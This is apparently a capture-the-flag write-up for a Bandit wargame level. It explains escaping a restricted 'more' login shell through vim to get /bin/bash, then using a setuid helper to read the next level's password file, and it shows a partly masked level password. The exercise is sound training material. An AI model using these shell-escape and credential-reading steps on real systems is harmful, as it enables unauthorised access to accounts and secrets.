## level 25

>bandit25:iCi86ttT4KSNe1armKiw************

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

### Solution:

>⚠️ **Note:** To get `more` executed, you have to resize your terminal since the text shown is very short.

```bash
# connect to bandit26 with the given rsa key
ssh bandit26@localhost -p 2220 -i bandit26.sshkey

# when more is executed press v to enter vim mode
v

# set the default shell in vim to /bin/bash
:set shell=/bin/bash

# execute a shell
:shell

# use the suid binary to grab the password for bandit27
./bandit27-do cat /etc/bandit_pass/bandit27
```